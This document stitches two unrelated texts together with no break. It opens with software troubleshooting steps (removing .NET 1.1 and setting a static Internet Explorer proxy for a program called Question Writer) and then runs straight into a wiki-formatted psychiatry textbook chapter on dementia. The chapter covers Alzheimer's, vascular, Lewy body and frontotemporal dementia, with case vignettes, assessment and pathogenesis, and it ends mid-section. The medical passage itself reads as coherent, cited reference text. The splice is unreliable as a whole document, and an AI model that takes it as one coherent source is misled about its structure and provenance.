1. Uninstall the .NET 1.1 framework. You can do this in Add/Remove programs, and the relevant entry is 'Microsoft .NET Framework 1.1'. You'll need a more recent version of the framework installed too. You may already have one installed - try starting Question Writer to find out. If not, you can download .NET 2.0 from Microsoft.
[[http://www.microsoft.com/downloads/details.aspx?FamilyID=0856eacb-4362-4b0d-8edd-aab15c5e04f5]]

2. Change your proxy setting in Internet Explorer so they are are set statically, rather than dynamically. You can do this in
Tools -&gt; Internet Options -&gt; Connections -&gt; Lan Settings -&gt; Proxy Server.


[[image:QW3 Proxy server settings.jpg|center]]



Make sure 'Use a proxy server for your LAN' is checked.

The values for 'Address' and 'Port' should be available from your system administrator.

;Dementia, Delirium, and Psychiatric Symptoms Secondary to General Medical Conditions

[[Category:Collections|WikiWork]]
&lt;u&gt;'''''Dementia, Delirium, and Psychiatric Symptoms Secondary to General Medical Conditions'''''&lt;/u&gt;

'''''Ronald Pies MD'''''

'''''Paul Summergrad MD'''''

&lt;u&gt;'''''Introduction'''''&lt;/u&gt;

In this chapter, we consider three related types of medical psychiatric disorders, usually accompanied by behavioral abnormalities: ''dementia,'' ''delirium'', and neurobehavioral disorders'' due to general medical conditions''. The common factor in these admittedly diverse conditions is a pathological alteration of brain structure and/or function, leading to abnormalities in cognition, affect, perception, or behavior. In the older U.S. literature, the term &quot;organic brain syndrome&quot; was often used to distinguish these conditions from so-called ''functional'' psychiatric disorders, such as schizophrenia or major depression. Indeed, the &quot;organic&quot; designation is retained in the ICD-10 classification (ICD-10, 1993).

In our view, however, the terms &quot;organic&quot; and &quot;functional&quot; suggest a false dichotomy. As we have learned more about the pathophysiology of common psychiatric disorders, such as schizophrenia or depression, the conceptual demarcation between these conditions and those discussed in the present chapter has become less distinct. For example, decreased metabolic function in frontal brain regions may be observed in both dementia and major depression, though the course and prognosis of these conditions differ markedly. Similarly, abnormalities in the cholinergic system may be present in both Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease and schizophrenia (Raedler et al, 2007), notwithstanding the many differences between these disorders. Advanced neuroimaging techniques, genetic studies, as well as abnormal neurobiologic function  in several animal models suggest receptor and circuit disturbances, even in the absence of traditional neurological abnormalities such as stroke or tumor. For all these reasons, we generally avoid the term &quot;organic&quot; in this chapter, but ''do'' use it when a particular study, author, or context justifies it.

The term &quot;cognitive disorder&quot; is often used to encompass delirium, dementia, and related conditions. This term appropriately emphasizes that a ''disturbance in memory, language, or attention'' is usually a cardinal feature of these disorders. However, the term &quot;cognitive disorder&quot; is far from ideal, since other aspects of consciousness, mood, and behavior may be strikingly abnormal in delirium, dementia, and related conditions. For example, the patient with frontal lobe dementia may show marked behavioral disinhibition, while the patient with Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease and dementia may show signs of major depression.

The disorders discussed in this chapter are seen in many health-care environments, and are by no means confined to psychiatric settings. For example, between 11-16% of inpatients on general medical units may experience delirium at some time during their admission (Levkoff et al, 1991). In skilled nursing facilities, at least 14 % of residents may suffer from some form of dementia (Sabbagh et al, 2003), with some studies finding that more than 50% of nursing home beds are occupied by patients with Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (Sadock &amp; Sadock, 2007, p. 329). And while there are no reliable prevalence statistics for psychiatric symptoms due to general medical conditions (GMCs), these disorders appear to be common in emergency department (ED) settings, where they often go undiagnosed. Indeed, in one study ( Tintinalli et al, 1994) the chart was documented &quot;medically clear&quot; in 80% of ED patients in whom medical disease should have been identified.

Finally, a word about diagnostic systems: in most respects, there are more similarities than differences between the DSM-IV and ICD-10 classifications of the disorders discussed in this chapter; indeed, our discussion emphasizes ''common features'' rather than the specific criteria set forth in these two systems. However, when significant differences are clinically relevant, we will note them.

&lt;u&gt;'''''DEMENTIA'''''&lt;/u&gt;

&lt;u&gt;'''''Phenomenology (Characteristic Features of the Dementias)'''''&lt;/u&gt;

Dementia may be broadly defined as ''a progressive, acquired impairment of cognitive function sufficient to cause functional decline, and occurring in a relatively normal (&quot;clear&quot;) level of consciousness''; i.e., in the absence of delirium (Sadock &amp; Sadock, 2007; Apostolova &amp; Cummings, 2008). We shall see, however, that there are some notable exceptions to this generalization, and that it is often more useful to define specific types of dementia. ''Global impairment of the intellect'' is a cardinal feature of dementia. More specifically, most dementia syndromes demonstrating the following neurobehavioral deficits:

Memory impairment (either impaired ability to learn new information, or to recall previous information), usually evident for at least 6 months.

Deterioration in judgment, planning, and organizing (e.g., impaired shopping, cooking, handling money)

Absence of &quot;clouding of consciousness&quot; for a period long enough to demonstrate decline in memory

Decline in emotional control or motivation; or a change in social behavior (e.g., emotional lability, irritability, apathy, loss of social graces). DSM-IV specifically emphasizes a significant impairment in social and/or occupational functioning, as a result of the aforementioned deficits.

DSM-IV emphasizes one or more of the following: ''aphasia'' (language disturbance), ''apraxia ''(impaired ability to carry out motor activity despite intact motor function), ''agnosia'' (failure to recognize objects despite normal sensory function); and ''disturbance in executive functioning'' (planning, organizing, sequencing, abstracting). In partial contrast, ICD-10 regards these as essentially ''supportive'' findings for diagnosis of dementia.

The epidemiology, clinical features, and pathogenesis of dementia vary considerably, depending on the subtype; for example, ''dementia of the Alzheimer type (DAT), Vascular Dementia, Lewy Body Dementia'', etc. Nevertheless, it is common to encounter elderly patients in the clinical or nursing home setting who carry only the syndromic diagnosis of &quot;dementia&quot; (Jacobson et al, 2007).

It is worth noting that not all definitions of dementia require memory impairment as a diagnostic criterion; indeed, some patients with ''frontotemporal dementia'' (FTD) may be severely affected with ''behavioral disturbances'' before memory impairment is prominent (Jacobson et al, 2007).

Dementia must be distinguished from so-called ''mild cognitive impairment'' (MCI), which appears to represent an intermediate stage between normal aging and dementia (Apostolova &amp; Cummings, 2008). Unlike those with dementia, MCI patients do ''not'' show significant impairment in activities of daily living.

&lt;u&gt;'''''Epidemiology of the Dementias'''''&lt;/u&gt;

Dementia of some type may afflict as many as 28 million individuals world-wide, with direct costs for care estimated at 156 billion U.S. dollars (Wimo et al, 2006). Of the total number of demented individuals worldwide, the largest proportion (5.2 million, or 18.5%) lives in China (Wimo et al, 2006). If one groups all dementias together, the estimated prevalence is about 5% in the general population older than age 65, and 30% in those older than age 85 (Sadock and Sadock, 2007 p. 329). Findings on racial variations in dementia are somewhat equivocal, but most studies have reported higher frequencies of dementia among nonwhite persons (Husaini et al, 2003).  Disproportionately high rates of dementia among African-Americans may be due, in part, to a higher prevalence of both hypertension and stroke among elderly African-Americans. Women generally have higher rates of dementia than men, largely because women live longer (Husaini et al, 2003). However, vascular dementia appears to be more common in men.

Dementia of the Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Type (DAT, &quot;Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease&quot;) is by far the most common type of dementia, making up roughly 35%-60% of cases worldwide (Mendez &amp; Cummings, 2003; Sadock and Sadock, 2007, p. 329). The wide range of these figures is due in part to some controversy over the classification of ''Lewy Body Dementia'' (LBD); i.e., if LBD is considered a variant form of DAT (Sadock and Sadock, 2007, p. 329), the prevalence figure for DAT tends toward the higher end of the range. Many geriatric psychiatrists consider LBD to be the second most prevalent dementia subtype (&quot;tied&quot; with mixed vascular dementia/DAT), with a prevalence of about 15%. About 10% of dementias are said to be represent pure vascular dementia, while another 5% represent fronto-temporal dementia (Mendez and Cummings, 2003; Jacobson et al, 2007). Some data suggest that the DAT/vascular dementia ratio is comparatively higher in South America and lower in Asia (Lopes &amp; Bottino, 2002), though the reasons for these trends are not clear. Miscellaneous causes of dementia—including cases due to Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, Creutzfeld-Jakob Disease,  Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s, HIV infection, and other conditions—probably constitute fewer than 5% of the total.

That said, there is a paucity of ''autopsy-based studies'' of dementia prevalence, which would presumably be more accurate than those based on clinical diagnosis alone. In one of the few such studies (Fu et al, 2004),  202 demented patients underwent brain-only autopsies, and the following types of dementia were found: 129 (63.8%) cases showed changes of severe Alzheimer disease; 21 (10.4%) showed combined neuropathologic abnormalities (Alzheimer disease plus another type of lesion, such as significant ischemic infarcts or diffuse Lewy body disease), 12 (5.9%) cases of relatively pure ischemic vascular dementia, 13 (6.4%) cases of diffuse Lewy body disease, and 8 (4.0%) cases of frontotemporal dementia. The remaining 19 (9.4%) patients showed various neuropathologic diagnoses, including normal pressure hydrocephalus and progressive supranuclear palsy. Notably, the authors concluded that, had these diagnoses been known ante mortem, the clinical care of the patients might well have been different (Fu et al, 2004).

&lt;u&gt;'''''Clinical Features of Dementia Subtypes'''''&lt;/u&gt;

&lt;u&gt;'''''Cortical vs. subcortical distinction'''''&lt;/u&gt;

{|border=&quot;0&quot; cellspacing=&quot;2&quot; width=&quot;100%&quot;
|The older literature on dementia often describes two broad subtypes that encompass many of the more pathologically-specific types of dementia. Though the distinction between so-called ''cortical'' and ''subcortical ''dementias is controversial, it remains a useful conceptual tool in preparation for understanding more specific forms of dementia (Turner et al, 2002). Although there is no specific neuropsychological pattern in subcortical dementia, this group of disorders is generally characterized by ''cognitive slowness, concomitant motor abnormalities,'' and a relatively ''low frequency of aphasias and apraxias'', compared with Alzheimer-type dementia (Turner et al, 2002).  The principal differences between cortical and subcortical dementias are summarized in Table 1. It is important to note that some conditions—such as multiple small strokes and certain toxic-metabolic disorders—produce symptoms of ''both'' cortical and subcortical dysfunction (Cummings, 1985). Furthermore, the cortical/subcortical distinction has become less useful as our understanding of specific dementia syndromes has increased (Turner et al, 2002). Indeed, Lerner and Riley (2008) have pointed out that the dementias of Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s and Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease—two putative &quot;subcortical&quot; dementias—are as different from each other as they are from Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, the classic &quot;cortical&quot; dementia. Furthermore, these authors note that &quot;…the pathological basis for dementia in (Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease) is now known to lie in the cerebral cortex…effectively rendering its designation as a &quot;subcortical&quot; dementia untenable.&quot; (p. 908). In short—though useful as a rough, first-pass approximation—the designations &quot;cortical&quot; and &quot;subcortical&quot; are likely to be modified with more specific pathoanatomical and descriptive assessments.

&lt;u&gt;'''''Dementia of the Alzheimer Type (DAT)'''''&lt;/u&gt;

''Case vignette: Mrs. A, a 91-year-old widowed Caucasian woman in good general health, was seen by her family physician for complaints of &quot;forgetting things a lot lately.&quot; Mrs. A&lt;nowiki&gt;’&lt;/nowiki&gt;s daughter, who often helped her mother with household chores, had noticed a change in her mother&lt;nowiki&gt;’&lt;/nowiki&gt;s thinking and behavior over the past two years. &quot;Mom used to be sharp as a tack and never forgot a thing,&quot; she reported. &quot;Nowadays, she has trouble remembering even simple things, like turning off the stove, or in what room she keeps all her bills and papers. The other day, I found that she had left the bath running for over an hour, and it flooded the whole upstairs. Sometimes, Mom confuses me with her sister, who died over twenty years ago. When I try to explain who I am, Mom sometimes gets kind of irritable with me, and says I&lt;nowiki&gt;’&lt;/nowiki&gt;m trying to confuse her.&quot; There was no history suggestive of stroke, sudden change in mental status, or loss of gross motor or sensory function. On mental status exam, the patient was pleasant, socially appropriate, and in no acute distress. She was oriented to the year, but not to month, day, or date. She recalled only one word item after three minutes. She could not remember the name of the two most recent U.S. Presidents, but was able to speak knowledgeably about the Presidents during the U.S. Great Depression (1929-1941). When asked to name three objects on the physician&lt;nowiki&gt;’&lt;/nowiki&gt;s desk (stapler, paper clip, and calendar), she named them as &quot;stapler, paper grip, and day book.&quot; A provisional diagnosis of &quot;dementia, probably of the Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s type&quot; was made by the physician.''

As the vignette suggests, DAT (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease) is characterized most saliently by a gradual onset and progression of cognitive decline. Frank signs and symptoms of DAT often follow a prodromal stage of mild memory impairment that does not markedly interfere with activities of daily living. With disease progression, the patient shows more global cognitive decline, with disturbance in language, visuospatial skills, executive functioning, and social interaction. Typical of progressive DAT is a ''transcortical sensory aphasia, ''in which the patient shows fluent word output and preserved ability to repeat spoken language, but impaired speech comprehension (Apostolova &amp; Cummings, 2008). '' ''With further progression of DAT, the patient shows impaired judgment and reduced ability to carry out activities of daily living. Disturbances in sleep-wake cycle or appetite often ensue. Although depression is often considered a hallmark of ''subcortical'' dementias, it is actually a common feature in DAT. However, only about half of patients with depression/dysphoria in DAT meet full criteria for major depression (Apostolova &amp; Cummings, 2008). Irritability, agitation (including pacing, &quot;fidgeting&quot; or verbal outbursts) and psychotic features (such as visual hallucinations and delusions of having been robbed) are also common in DAT, and impose great emotional burdens on the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s family and caregivers. Patients with ''early-onset DAT'' (see under Pathogenesis) may show atypical features, such as prominent aphasia, myoclonic jerks, emotional lability, or obsessive-compulsive symptoms (Apostolova &amp; Cummings, 2008).

&lt;u&gt;'''''Vascular Dementias'''''&lt;/u&gt;

Vascular dementia (VaD) is considered the third leading cause of dementia in the elderly, after DAT and Dementia with Lewy Bodies (Apostolova &amp; Cummings, 2008). However, some experts regard VaD as a heterogeneous syndrome, rather than a distinct disorder, in which the underlying cause is some type of cerebrovascular disease and the end result is dementia (Wright, 2007).  Several subtypes of VaD are recognized.  ''Multi-infarct dementia'' (MID)—the older term for VaD—involves multiple, relatively large infarctions, usually due to recurrent cerebral emboli originating from the heart, thromboembolic events, or atherosclerotic plaques. ''Single, strategically-placed infarct; lacunar state; ''and'' Binswanger&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (subcortical arteriosclerotic encephalopathy  (SAE) due to arteriosclerotic narrowing of deep penetrating white matter arterioles) are also considered VaD subtypes (see below).

In partial contrast to DAT, vascular dementia often shows a ''subcortical pattern'', with prominent psychomotor slowing, executive dysfunction, and mood changes. Speech difficulties (dysarthria) are common. Compared with DAT, memory deficits in VaD are more often related to ''retrieval'' than to initial ''encoding ''of memories; for example, the patient with VaD may be unable spontaneously to &quot;retrieve&quot; the name of a recently specified object (such as &quot;chair&quot;), but can do so if provided a clue (&quot;It rhymes with hair&quot;). In contrast to the course of DAT, VaD of the multi infarct variety may have a &quot;stuttering&quot; course, with a ''stepwise progression'' of cognitive deterioration, often accompanied by lateralizing neurological deficits (Sadock &amp; Sadock, 2007). SAE often has an insidious course that may be temporally difficult to distinguish from DAT. The neurological findings of multi-infarct dementia may include focal findings such as weakness, spasticity, rigidity, and extensor plantar reflex (positive Babinski sign). Compared with DAT, VaD has a higher incidence and greater severity of ''new-onset depression, ''especially in older individuals; this is sometimes referred to as &quot;vascular depression.&quot; Psychosis is also relatively common in VaD.

&lt;u&gt;'''Lewy Body Dementia'''&lt;/u&gt;

Barely recognized only 20 years ago, Dementia with Lewy Bodies (DLB) is now believed to be the second most prevalent dementia of old age, accounting for some 15-20% of cases (McKeith et al, 1996). Compared with DAT, memory impairment in DLB is less pronounced, but ''cognitive fluctuations'' are severe. Variability in the patient&lt;nowiki&gt;’&lt;/nowiki&gt;s attention, alertness, and level of consciousness may reach the proportions of frank ''delirium'' (see below, Delirium). Recurrent ''visual hallucinations'' are also one of the hallmarks of DLB. DLB shares features with the dementia of ''Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (PD), and diagnosis is conventionally determined by the temporal pattern of motor symptoms: if these precede cognitive decline by more than 12 months, PD is diagnosed, whereas motor symptoms occurring within a year of cognitive decline would be diagnosed as DLB (Apostolova &amp; Cummings, 2008). ''Bradykinesia, rigidity, resting tremor, ''and'' gait disturbance ''are commonly seen in DLB, but cases of DLB without extrapyramidal symptoms are reported. Other clues to the presence of DLB include a history of falls or syncopal episodes; REM (rapid eye movement) sleep behavior disorder (such as violent behaviors during REM sleep); and extreme sensitivity to neuroleptics and atypical antipsychotics (Apostolova &amp; Cummings, 2008; Jacobson et al, 2007—see under Treatment).

&lt;u&gt;'''''Fronto-temporal dementia'''''&lt;/u&gt;

Fronto-temporal dementia (FTD) is actually a group of three related disorders, involving focal atrophy of the frontal and/or temporal lobes, accompanied by characteristic neurobehavioral impairments (Apostolova &amp; Cummings, 2008). So-called Frontal Variant FTD is also known as ''Pick&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' and makes up the majority of FTD cases. (''Primary Progressive Aphasia'' and ''Semantic Dementia ''are less common FTD variants, and will not be discussed here).

Patients with Frontal Variant FTD typically do not complain of cognitive problems to the same extent as patients with DAT; rather, they show insidious but profound alterations in personality, social skills, and impulse control. However, neuropsychological testing does reveal deficits in verbal fluency, abstract thinking and planning, and verbal memory, often with sparing of ''visual ''memory. Compared to DAT patients, those with FTD usually have more mood disturbance, behavioral disinhibition, and abnormal motor behavior. Curiously, nearly half of all FTD patients—two years after diagnosis--will show one or more stereotyped or obsessive-compulsive behaviors. These may include hand clapping, hoarding, and repetitive or ritualistic  behaviors (Mendez &amp; Perryman, 2002; Apostolova &amp; Cummings, 2008). Twenty per cent of FTD patients may develop a form of Kluver-Bucy Syndrome (hyperorality, hypersexuality, and abnormal exploratory behavior) two years after diagnosis (Mendez &amp; Perryman, 2002).

''Case vignette: Mr. J. was a 57-year-old married white male, with a two-year history of marked &quot;change in personality&quot;, according to his wife. &quot;It&lt;nowiki&gt;’&lt;/nowiki&gt;s like night and day,&quot; she told the neurologist, &quot;compared to the way Fred used to be. He was the kindest, gentlest man I ever knew. Now, it&lt;nowiki&gt;’&lt;/nowiki&gt;s like Jekyll and Hyde—I&lt;nowiki&gt;’&lt;/nowiki&gt;m afraid to look at him cross-eyed, for fear he will scream at me, or worse.&quot; Mr. J. had always been a very empathic individual, but now seemed unconcerned with the wishes or needs of others. His hygiene and personal grooming had deteriorated over the past year, and he had begun to engage in bizarre rituals every morning; for example, counting to 100 before getting out of bed, then eating exactly six large muffins, without saying a word to his wife. Most of the time, Mr. J. seemed &quot;flat&quot; and apathetic; however, when his wife questioned any of his actions, he would shout at her or throw some object across the room.''

''A neurological evaluation found evidence of significant frontal lobe dysfunction and positive &quot;grasp reflex&quot;, but was otherwise within normal limits.''

Miscellaneous Dementia Syndromes

In addition to the aforementioned types of dementia, about 5% of patients will have dementia due to miscellaneous causes, including :  ''Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, Creutzfeld-Jakob Disease,  Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease, HIV infection'', and other conditions''.  Huntington&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (HD)—an autosomal dominantly-transmitted, progressive disorder—has its peak onset in the fourth and fifth decade, though a smaller peak occurs in the 20s. The classic presentation for HD is a combination of ''chorea and dementia'', in the setting of a positive family history; however, the earliest presentation may be with ''affective'' or ''psychotic ''symptons (Lerner &amp; Riley, 2008). A &quot;tendency toward suicide&quot; in HD was recognized by Huntington himself, and suicidal ideation may be the presenting problem. ''Creutzfeld-Jakob Disease'' (CJD) is caused by an abnormal protein called a ''prion'', and typically presents as a rapidly-progressive dementia, accompanied by ataxia and multi-focal myoclonic jerks. A third of patients with CJD show a prodrome of fatigue, headache, insomnia, malaise, or depression (Apostolova &amp; Cummings, 2008). Dementia due to ''Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease'' (PD) occurs in roughly 30% of patients with PD, with a larger percentage afflicted as age increases (Lerner &amp; Riley, 2008). However, cognitive symptoms can occur at any stage of PD, and are often characterized by slowed mentation (bradyphrenia), impaired visuo-spatial skills (such as facial recognition and operating objects in space) and executive dysfunction. Affective disturbance—especially depression—is very common in PD, and may be present in over 60% of cases. Anxiety is also commonly seen in PD, although less frequently than depression (Lerner &amp; Riley, 2008). Psychosis is also encountered in PD, usually related to dopaminergic effects of anti-Parkinsonian medication (Lerner &amp; Riley, 2008).

Cognitive deficits associated with ''HIV infection'' are considered part of a continuum, known as ''HIV-1-associated cognitive-motor complex (HCMC). ''Frank HIV dementia is the most serious form of HCMC, and occurs in roughly 30% of HIV-infected individuals (Fernandez &amp; Tan, 2008). The ''early'' clinical picture in HCMC is usually characterized by ''subcortical'' features (see Table 1), including reduced information processing speed; motor slowing or dyscoordination; and depressed mood. However, as the illness progresses, more classically &quot;cortical&quot; features may develop, including aphasia, agnosia, apraxia, and frontal lobe symptoms (Fernandez &amp; Tan, 2008). Behavioral disinhibition, mania, and psychotic features are often found in the later stages of HIV-associated dementia.

&lt;u&gt;'''''Assessment and Diagnostic Testing'''''&lt;/u&gt;

In addition to obvious abnormalities in the ''mental status exam'', the patient with dementia may show a variety of deficits on more sophisticated ''screening instruments'' and  ''neuropsychological assessments'', and on ''neuroimaging'' studies.

&lt;u&gt;'''''Prototypical mental status findings in dementia'''''&lt;/u&gt;

Considering the diverse subtypes of dementias, it is difficult to generalize about findings on mental status exam. Furthermore, the clinician must proceed with the caveat that a patient cannot be diagnosed with dementia, in the presence of active ''delirium'' (see Delirium, section  ). Nonetheless , if we &quot;average out&quot; the differences between cortical and subcortical dementia presentations, the following mental status exam could be considered typical of the patient with ''moderately severe dementia'':

''The patient appears alert, but apathetic and somewhat agitated, and is seen to be twisting her fingers through her hair. Her speech is fluent and well-articulated, but she uses many long, meaningless phrases (such as, &quot;The thing of it is, you see, I need the thing to be, you know, whatever.&quot;). She is oriented to year, but not the month or day. She recalls only 1 of three named items, after a three minute interval of distraction. She cannot remember the names of the college from which she graduated, and gave an incorrect response when asked, &quot;Who is the current president of the U.S.?&quot; When shown a picture of a cup, she calls it a &quot;vase&quot;, and identifies the examiner&lt;nowiki&gt;’&lt;/nowiki&gt;s stethoscope as a &quot;hearing aid&quot;. She is able to subtract 10 from 100 correctly, but cannot do serial 10&lt;nowiki&gt;’&lt;/nowiki&gt;s accurately (&quot;90, 85, 75, 65, 50, 40…&quot;). She produces a poorly-constructed drawing when asked to copy a cube, and her drawing of a clock reading &quot;ten past two&quot; was incorrect (with the big hand placed at the &quot;10&quot; position). When asked to interpret the proverb, &quot;The early bird catches the worm,&quot; her response is very concrete (&quot;The bird that gets up early will catch the worm.&quot;). When asked if she has any particular fears lately, she replies, &quot;I don&lt;nowiki&gt;’&lt;/nowiki&gt;t know what the neighbors think of me, but I know they steal from my bedroom.&quot;'' (Spitzer et al, 1994).

&lt;u&gt;'''''Screening instruments and neuropsychological assessments'''''&lt;/u&gt;

The most widely-used screening instrument for dementia is the Mini-Mental State Exam (MMSE) developed by Folstein ( Folstein et al, 1975), an 11-item test that evaluates orientation, registration, attention and calculation, recall, and language. The maximum score on the MMSE is 30 and—depending on age and education--a score of 28 or higher is usually considered &quot;normal.&quot; A &quot;low normal&quot; score (24 or higher) appears to predict development of dementia after three years (Braekhus et al, 1995). The MMSE does not specifically examine executive cognitive function. An expanded version of the MMSE (the 3MS) does include some executive function items, and may be more sensitive, specific and predictive of functional outcome than the MMSE (Grace et al, 1995). Neither the MMSE nor the 3MS is ideally suited to detecting features of &quot;milder&quot; or subcortical dementia, or detecting impairments in social or operational functioning. For HIV-related dementia, the HIV dementia scale or the Mental Alternation Test may be better alternatives (van Harten et al, 2004; Billick et al, 2001). More complete neuropsychological assessment of dementia usually includes use of the Wechsler Adult Intelligence Scale-III (WAIS-III), the Wechsler Memory Scale (WMS), the Rey Complex Figure, and Trail Making Test (Howieson &amp; Lezak, 2008), among others. These ancillary tests may be helpful in pinpointing specific functional impairments and their neuroanatomical correlates.

&lt;u&gt;'''''Neuroimaging studies'''''&lt;/u&gt;

Neither the ICD-10 nor the DSM-IV criteria for dementia require any corroborative evidence obtained from neuroimaging studies. Nevertheless, neuroimaging techniques such as magnetic resonance imaging (MRI) or postitron emission tomography (PET) may be helpful in clarifying diagnosis and ruling out other types of brain disease, such as normal pressure hydrocephalus. Indeed, the American Academy of Neurology recommends a non-contrast structural image (CT or MRI) in the initial evaluation of cognitive impairment (Apostolova &amp; Cummings, 2008). With DAT, global cerebral atrophy, especially in mesial temporal and parietal regions, is the usual finding on CT or MRI. On PET or SPECT (single-photon emission computed tomography), DAT patients usually show bilateral hypometabolism in mesial temporal and parietal regions. Recently, a novel radio-labeled PET imaging agent, ''18F-AV-45'', has been developed, and may eventually provide a practical approach for routine brain imaging for Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Association, 2008).

In dementia with Lewy Bodies (DLB), bilateral parietal and ''occipital ''hypoperfusion is seen. The latter helps distinguish DLB from DAT, and may explain the high prevalence of ''visual ''hallucinations in DLB. Structural imaging (CT, MRI) is not helpful in diagnosing DLB (Lerner &amp; Riley, p. 919). In frontotemporal dementia (FTD), the expected hypometabolism is seen in frontotemporal regions, using PET scanning (Apostolova &amp; Cummings, 2008). Structural imaging (such as MRI) shows distinct profiles for the three main subtypes of FTD, though some degree of frontal and/or temporal lobe involvement is seen in all three subtypes.

In vascular dementia, both CT and especially MRI can be useful in defining cortical and white matter abnormalities.  In multi-infract or lacunar states, evidence of prior infarct can be seen. In SAE, periventricular white matter abnormalities can frequently be seen, although limited periventricular abnormatilies just anterior or proximal to the lateral ventricle can also be seen in normal aging.  Periventricular abnormalities of greater size or distance from the ventricles, or extending into the centrum semiovale, are more likely to represent evidence of clinically significant disease.

Investigational Biomarkers

Given the uncertainties of early dementia diagnosis, there has been great interest in a &quot;blood test&quot; or other valid biomarker for DAT, the most common type of dementia. Recently, for example, researchers in Germany found differences in levels of ''CD-69'', a protein involved in white blood cell growth and production, in normal subjects versus those with DAT or Parkinson&lt;nowiki&gt;’&lt;/nowiki&gt;s-related dementia (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Association, 2008). Irish researchers have focused on the enzyme ''beta-secretase'' (BACE1) activity in the brain. (BACE1 is one of two enzymes involved in the pathological processing of ''amyloid precursor protein'' (APP)—see below, under Pathogenesis).   High levels of BACE1 in the spinal fluid appear to be correlated with development of DAT. At present, these remain promising, but only investigational, techniques (Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Association, 2008).

&lt;u&gt;'''''Pathogenesis of Dementias'''''&lt;/u&gt;

&lt;u&gt;'''''Biogenetic determinants and pathophysiology'''''&lt;/u&gt;

&lt;u&gt;'''''Dementia of the Alzheimer Type'''''&lt;/u&gt;

From the biogenetic standpoint,'' ''Alzheimer&lt;nowiki&gt;’&lt;/nowiki&gt;s Disease (DAT) appears to be of two main types: ''late-onset'' (sporadic) and ''early-onset''. When DAT begins after age 65 (late onset), its mode of inheritance appears to involve a constellation of genes, probably influenced by epigenetic factors (i.e., influences that do not change DNA sequence) such as diet and exercise. However, increasing age is the most important risk factor, with rates of DAT rising to 40% in those 85 years or older. Increasing age acts synergistically with the ''apolipoprotein E'' (APOE) ''gene polymorphism'' on chromosome 19. The APOE gene takes three major forms (''alleles''), termed ''ApoE2'', ''ApoE3'', and ''ApoE4''. APOE4 (E4) greatly increases the likelihood of late-onset DAT; i.e., individuals with two E4 genes develop DAT eight times more frequently than do those with no E4 gene. (Sadock and Sadock, 2007 p. 330; Apostolova &amp; Cummings, 2008). It appears that E4 promotes ''aggregation of amyloid β'' (Aβ), which leads to a variety of pathological changes in brain tissue (see below).

In ''early-onset'' DAT, instead of—or possibly in addition to—APOE4, three ''autosomal dominant mutations'' appear to be important: the APP gene mutation on chromosome 21; the presenilin-1-gene mutation on chromosome 14; and the presenilin-2 gene mutation on chromosome 1. As noted above, early-onset DAT may be associated with atypical features, as well as shorter survival time (Apostolova &amp; Cummings, 2008).

The classic pathological findings in DAT is the presence of ''senile plaques, neurofibrillary tangles, neuronal and synaptic loss'', and'' granulovascular degeneration of neurons'' (Sadock &amp; Sadock, 2007, p. 330). The pathophysiology of DAT is integrally related to the over-production or accumulation of ''amyloid β'' (Aβ). The &lt;nowiki&gt;’&lt;/nowiki&gt;amyloid cascade hypothesis&lt;nowiki&gt;’&lt;/nowiki&gt; of DAT posits that abnormal enzymatic processing of ''beta-amyloid precursor protein'' (βAPP) leads to overproduction of neurotoxic Aβ peptides. These abnormal peptides polymerize (form chains) and &quot;clump together&quot;, forming several types of destructive, extracellular inclusion bodies called ''plaques''. The first plaques appear in temporal-occipital association regions in patients with DAT. In addition, DAT may involve abnormal phosphorylation of a structural protein called ''tau'', which is involved in microtubulular transport—the intracellular &quot;highway system&quot; that transports vital constituents within neurons (Apostolova &amp; Cummings, 2008). In DAT, hyper-phosphorylated tau forms distructive intracellular inclusions called ''neurofibrillary tangles'' (NFTs).  Together, these plaques and tangles &quot;choke off&quot; normal neuronal function and neurotransmitter production in DAT, particularly affecting the production of ''acetylcholine'' (ACh) and norepinephrine. Degeneration of cholinergic neurons is present in the ''nucleus basalis of Meynert'' in persons with DAT, and low brain levels of ACh and choline acetyltransferase are also found. Cholinergic deficits provide the rationale for use of ''cholinesterase inhibitors'' in the treatment of DAT (see below, Treatment). In addition, overactivation of NMDA receptors by the excitatory neurotransmitter, ''glutamate'', is believed to play a role in DAT, and is the basis for one pharmacological treatment (see below re: memantine). Recently, it was discovered that elevated serum levels of ''amyloid β ''are associated with reduced cognitive function even in healthy older adults, similar to patterns observed in early DAT (Gunstad et al, 2008).

''Vascular Dementia ''VaD is caused by cumulative ischemic or hemorrhagic brain damage, usually secondary to cerebrovascular and cardiovascular pathology, and is often seen in association with hypertension, diabetes and hyperlipidemia (Apostolova &amp; Cummings, 2008). There are somewhat conflicting data regarding the contribution of the ApoE gene to the pathogenesis of VaD, but any such contribution appears smaller than that in DAT (Higuchi et al, 1996).

